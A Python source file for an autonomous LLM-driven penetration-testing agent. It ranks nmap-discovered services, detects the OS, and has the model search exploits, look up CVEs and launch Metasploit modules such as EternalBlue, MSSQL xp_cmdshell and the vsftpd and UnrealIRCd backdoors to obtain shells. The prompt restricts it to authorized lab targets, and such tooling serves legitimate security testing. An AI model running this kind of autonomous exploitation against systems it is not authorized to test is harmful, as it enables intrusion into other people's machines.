"""
agent.py — LangChain ReAct Penetration Testing Agent

Implements a ReAct-style agent that autonomously reasons over each target host,
selects and calls tools (exploit search, CVE lookup, Metasploit execution),
and returns structured findings for report generation.

Service modes:
    default  — top 6 highest-priority services only (fastest, cheapest)
    targeted — only the specific ports/services passed in via --services
    full     — all discovered services (slowest, most thorough)
"""

import os
from dotenv import load_dotenv
from langchain_anthropic import ChatAnthropic
from langchain_core.tools import tool
from langgraph.prebuilt import create_react_agent

from tools.retriever import search_exploits
from tools.cve_lookup import lookup_cve
from tools.msf_exec import parse_and_run

load_dotenv()

# ── Service priority list (default mode) ─────────────────────────────────────
# Ordered by likelihood of exploitability — agent investigates top N of these
PRIORITY_SERVICES = [
    "ftp", "irc", "netbios-ssn", "microsoft-ds",  # classic backdoors
    "http", "ajp13",                                # web / tomcat
    "mysql", "postgresql", "ms-sql",               # databases
    "ssh", "telnet", "rsh", "rlogin",              # remote access
    "java-rmi", "bindshell", "vnc",                # misc high-value
    "smtp", "nfs", "rpcbind",                      # lower priority
]

DEFAULT_MAX_SERVICES = 6  # how many services to investigate in default mode


# ── Tool definitions ──────────────────────────────────────────────────────────

@tool
def search_exploits_tool(query: str) -> str:
    """
    Search the hybrid RAG knowledge base for exploit techniques.

    Args:
        query: Service name and version, e.g. 'vsftpd 2.3.4' or 'ms17-010 windows smb'.

    Returns:
        Relevant exploit techniques and payloads as a string.
    """
    return search_exploits(query)


@tool
def lookup_cve_tool(keyword: str) -> str:
    """
    Look up CVEs for a product using the NIST NVD REST API v2.0.

    Args:
        keyword: Product name and version, e.g. 'vsftpd 2.3.4'.

    Returns:
        CVE IDs, CVSS scores, and descriptions as a string.
    """
    return lookup_cve(keyword)


@tool
def run_exploit_tool(json_input: str) -> str:
    """
    Execute a Metasploit exploit module against a target via msfrpcd RPC.

    Args:
        json_input: JSON string with keys:
            - module (str): Metasploit module path
            - options (dict): Module options including RHOSTS
            - _os_hint (str): 'linux' or 'windows' for payload selection

    Returns:
        Exploit output including shell access confirmation or failure reason.

    Example:
        {"module": "exploit/unix/ftp/vsftpd_234_backdoor",
         "options": {"RHOSTS": "192.168.211.128"},
         "_os_hint": "linux"}
    """
    return parse_and_run(json_input)


# ── Agent setup ───────────────────────────────────────────────────────────────

tools = [search_exploits_tool, lookup_cve_tool, run_exploit_tool]

llm = ChatAnthropic(
    model="claude-sonnet-4-6",
    api_key=os.getenv("ANTHROPIC_API_KEY"),
    max_tokens=2048,  # reduced from 4096 to cut costs
)

agent = create_react_agent(llm, tools)


# ── Service filtering ─────────────────────────────────────────────────────────

def filter_services(target: dict, mode: str = "default", ports: list = None) -> dict:
    """
    Filter a target's services based on the selected scan mode.

    Modes:
        default  — top DEFAULT_MAX_SERVICES services ranked by PRIORITY_SERVICES list
        targeted — only services matching the ports list provided
        full     — all services, no filtering

    Args:
        target (dict): Target dict with 'ip' and 'services' from parser.
        mode (str): One of 'default', 'targeted', 'full'.
        ports (list): List of port strings to target (only used in 'targeted' mode).

    Returns:
        dict: Target dict with filtered services list.
    """
    services = target.get("services", [])

    if mode == "full":
        # No filtering — investigate everything
        return target

    if mode == "targeted" and ports:
        # Only investigate user-specified ports
        filtered = [s for s in services if str(s.get("port", "")) in ports]
        if not filtered:
            warn_msg = f"No services found on specified ports {ports} for {target.get('ip')}. Falling back to default mode."
            print(f"  [!] {warn_msg}")
            # Fall through to default
        else:
            return {**target, "services": filtered}

    # Default mode — rank by priority list, take top N
    def priority_rank(svc):
        svc_name = svc.get("service", "").lower()
        try:
            return PRIORITY_SERVICES.index(svc_name)
        except ValueError:
            return len(PRIORITY_SERVICES)  # unknown services go last

    ranked = sorted(services, key=priority_rank)
    return {**target, "services": ranked[:DEFAULT_MAX_SERVICES]}


# ── OS detection ──────────────────────────────────────────────────────────────

def detect_os(target: dict) -> str:
    """
    Infer the target OS from nmap service fingerprints.

    Args:
        target (dict): Single target dict with 'services' list.

    Returns:
        str: 'windows' or 'linux'.
    """
    windows_keywords = [
        "windows", "microsoft", "ms-sql", "iis", "rdp",
        "microsoft-ds", "netbios", "msrpc",
    ]
    for svc in target.get("services", []):
        combined = (
            svc.get("product", "") +
            svc.get("service", "") +
            svc.get("version", "")
        ).lower()
        if any(kw in combined for kw in windows_keywords):
            return "windows"
    return "linux"


# ── Agent runner ──────────────────────────────────────────────────────────────

def run_agent_on_target(target: dict, mode: str = "default", ports: list = None) -> str:
    """
    Run the ReAct agent against a single target host.

    Filters services according to mode, constructs an OS-specific task prompt,
    invokes the LangChain ReAct agent, and returns the agent's findings.

    Args:
        target (dict): Single target dict with 'ip' and 'services' from parser.
        mode (str): Service filter mode — 'default', 'targeted', or 'full'.
        ports (list): Specific ports to target (only used when mode='targeted').

    Returns:
        str: Agent's final output describing exploitation results and findings.
    """
    # Apply service filter before passing to agent
    filtered_target = filter_services(target, mode=mode, ports=ports)
    os_hint = detect_os(filtered_target)
    ip = filtered_target.get("ip", "unknown")
    num_services = len(filtered_target.get("services", []))

    if os_hint == "windows":
        os_specific = """
WINDOWS TARGET GUIDANCE:
- Try MS17-010 EternalBlue first if SMB (445) is open
- Try MSSQL xp_cmdshell if SQL Server (1433) is open
- Use _os_hint: "windows" in all run_exploit_tool calls
- Use module: exploit/windows/smb/ms17_010_eternalblue for EternalBlue
- Use module: exploit/windows/mssql/mssql_payload for MSSQL
- After getting a shell try: whoami, ipconfig, systeminfo
"""
    else:
        os_specific = """
LINUX TARGET GUIDANCE:
- Try vsftpd 2.3.4 backdoor first if FTP (21) is open
- Try UnrealIRCd backdoor if IRC (6667) is open
- Try Samba usermap_script if SMB (139/445) is open
- Use _os_hint: "linux" in all run_exploit_tool calls
- After getting a shell try: id, whoami, uname -a
"""

    task = f"""You are a penetration testing agent operating against authorized sandboxed lab targets only.

Target: {ip}
OS: {os_hint.upper()}
Mode: {mode.upper()} ({num_services} services to investigate)
Services:
{filtered_target}

{os_specific}

For each service listed above:
1. Search for relevant exploit techniques using search_exploits_tool
2. Look up CVEs using lookup_cve_tool
3. Attempt exploitation using run_exploit_tool with _os_hint: "{os_hint}"
4. Record what worked and what did not

Only target {ip}. Begin your assessment now.
"""
    result = agent.invoke(
        {"messages": [{"role": "user", "content": task}]},
        config={"recursion_limit": 15},  # cap agent steps to reduce API calls
    )
    return result["messages"][-1].content


def run_agent(targets: list, mode: str = "default", ports: list = None) -> dict:
    """
    Run the ReAct agent against each target host independently.

    Args:
        targets (list): List of target dicts from parser.parse_nmap().
        mode (str): Service filter mode — 'default', 'targeted', or 'full'.
        ports (list): Specific ports to investigate (only used when mode='targeted').

    Returns:
        dict: Mapping of IP address to agent findings string.
    """
    results = {}
    for target in targets:
        ip = target.get("ip", "unknown")
        results[ip] = run_agent_on_target(target, mode=mode, ports=ports)
    return results
